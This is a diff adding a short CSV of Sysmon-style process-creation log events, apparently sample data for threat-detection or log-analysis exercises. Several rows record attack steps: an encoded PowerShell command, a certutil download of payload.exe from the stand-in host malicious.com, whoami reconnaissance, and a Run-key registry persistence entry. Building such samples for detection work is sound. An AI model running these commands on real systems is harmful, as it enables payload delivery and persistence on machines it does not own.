@@ -1,0 +1,6 @@
+UtcTime,EventID,Image,CommandLine,User,SourceIp
+2026-05-16 12:10:01,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -enc aQBlAHg=",Aayushi,192.168.1.5
+2026-05-16 12:11:20,1,C:\Windows\System32\certutil.exe,"certutil.exe -urlcache -f http://malicious.com/payload.exe payload.exe",Aayushi,192.168.1.5
+2026-05-16 12:12:30,1,C:\Windows\System32\cmd.exe,"cmd.exe /c whoami",Aayushi,192.168.1.5
+2026-05-16 12:13:45,1,C:\Windows\System32\reg.exe,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d C:\Users\Public\updater.exe",Aayushi,192.168.1.5
+2026-05-16 12:14:10,1,C:\Windows\System32\notepad.exe,"notepad.exe",Aayushi,192.168.1.5
